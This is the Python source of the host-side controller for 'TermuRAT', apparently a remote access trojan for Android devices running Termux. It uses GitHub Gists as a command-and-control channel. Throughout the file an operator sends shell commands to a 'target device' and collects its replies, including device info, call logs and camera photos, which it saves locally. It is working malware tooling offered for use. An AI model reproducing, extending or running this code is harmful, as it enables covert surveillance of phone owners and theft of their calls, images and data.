import time
import sys
import json
from subprocess import getoutput as output
from subprocess import run
from requirements_for_host import *

print("""\033[31m
MMP""MM""YMM                                        `7MM\"""Mq.       db  MMP""MM""YMM
P'   MM   `7                                          MM   `MM.     ;MM: P'   MM   `7
     MM  .gP"Ya `7Mb,od8 `7MMpMMMb.pMMMb.`7MM  `7MM   MM   ,M9     ,V^MM.     MM     
     MM ,M'   Yb  MM' "'   MM    MM    MM  MM    MM   MMmmdM9     ,M  `MM     MM     
     MM 8M""""""  MM       MM    MM    MM  MM    MM   MM  YM.     AbmmmqMA    MM     
     MM YM.    ,  MM       MM    MM    MM  MM    MM   MM   `Mb.  A'     VML   MM     
   .JMML.`Mbmmd'.JMML.   .JMML  JMML  JMML.`Mbod"YML.JMML. .JMM.AMA.   .AMMA.JMML.   

            \033[91m GitHub: https://github.com/opsonusdh/TermuRAT\033[0m\n""")

if not data["token"]:
    print("Github token is not given in data.json file. Aborting...")
    sys.exit()

# Clear terminal
run("clear", shell=True)
output("mkdir logs")
dev_inf = "N/A"
pwd_home = "/data/data/com.termux/files/home"
path = pwd_home

inp_txt = f"\033[92m┌──(\033[94m{dev_inf}\033[92m)-[\033[0m\033[1m~\033[0m\033[92m]\n\033[92m└─\033[94m$\033[0m "



# Step 2: Initialize Gist IDs if not set
if data.get("to_target_gist_id", "") == "":
    command_data = {
        "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
        "command": "termux-telephony-deviceinfo"
    }
    gist_url = create_gist("to_target.json", command_data)
    gist_id = gist_url.split("/")[-1]
    data["to_target_gist_id"] = gist_id
    save_data(data)

if data.get("to_host_gist_id", "") == "":
    t = time.strftime("%d-%m-%Y_%H:%M:%S")
    init_data = {
        "time": t,
        "command": "",
        "info": "",
        "deviceinfo": "N/A",
    }
    gist_url = create_gist("to_host.json", init_data)
    gist_id = gist_url.split("/")[-1]
    data["to_host_gist_id"] = gist_id
    save_data(data)
    with open("last_connection_time", "w") as file:
        file.write(t)
else:
    q = json.loads(read_gist(data["to_host_gist_id"]))
    t = q["time"]
    with open("last_connection_time", "w") as file:
        file.write(t)

print(f"Save the following data in the target device's data.json:\n\n{str(data).replace("'",'"')}")
input("\nCompleted? Press Enter: ")
run("clear", shell=True)

# Step 3: Initial command send
m = input(inp_txt)
edit_gist(
    data["to_target_gist_id"],
    "to_target.json",
    {
        "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
        "command": m
    }
)


# Step 4: Loop to receive responses
while True:
    with open("last_connection_time") as file:
        last_received_time = file.read().strip()

    received = read_gist(data["to_host_gist_id"])
    
    received = json.loads(received)
    if received.get("time") == last_received_time or not received:
        time.sleep(3)
        continue
    
    dev_inf = received["deviceinfo"]
    a = received["pwd"]
    a = a.split(pwd_home)
    if a[0] == "":
        path = "~"+pwd_home.join(a[1:])
    else:
        path = pwd_home.join(a)
    
    
    with open("last_connection_time", "w") as file:
        file.write(received["time"])
    
    if received['command']  == "termurat exit" and received["info"] == "Done":
        sys.exit()
    elif "termux-call-log" in received['command'] and "termux-call-log:" not in received["info"]:
        r = received['command'].split(" ")
        if "-o" in r:
            e = r.index("-o")+1
            e = int(r[e])
            visualize_data(received["info"], 0, "", e)
            
    elif "termux-camera-photo" in received['command'] and received["info"] != "Failed to capture image.":
        file_path = f"logs/{received['time']} | {received['command']}.txt"
        run(f"touch '{file_path}'", shell=True)
        with open(file_path, "w") as file:
              file.write(received.get("info", ""))
        print(received.get("info", ""))
        w = input("Do you want to download the image? [y/n]: ")
        if w.lower() in ["y", "yes"]:
                  print("Downloading image. Please wait...")
                  download_image(received.get("info", ""), f"logs/{received['time']} | {received['command']}.jpg")
                  print("Done")
                   
    else:
        if "/" not in received['command']:
              file_path = f"logs/{received['time']} | {received['command']}.txt"
              run(f"touch '{file_path}'", shell=True)
              with open(file_path, "w") as file:
                   file.write(received.get("info", ""))
        else:
            c = received['command']
            c = c.replace("/","_")
            file_path = f"logs/{received['time']} | {c}.txt"
            run(f"touch '{file_path}'", shell=True)
            with open(file_path, "w") as file:
                   file.write(received.get("info", ""))
        visualize_data(received.get("info", ""))
    inp_txt = f"\033[92m┌──(\033[94m{dev_inf}\033[92m)-[\033[0m\033[1m{path}\033[0m\033[92m]\n\033[92m└─\033[94m$\033[0m "
    m = input(inp_txt)
    if m in ["termurat exit -l", "termurat exit --local"]:
        sys.exit()
    elif m in ["termurat exit -h", "termurat exit --h"]:
        print("termurat exit: Exits the programme.")
        print("Use: termurat exit <options>")
        print("options:")
        print("    None: when no options specified it stops the programme on both target and host device, ")
        print("    -l, --local: stops the programme on host device but programme on target device should not be effected,")
        print("    -h, --help: shows the help menu.")
    elif m == 'clear':
        run("clear", shell=True)
    edit_gist(
        data["to_target_gist_id"],
        "to_target.json",
        {
            "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
            "command": m
        }
    )
    
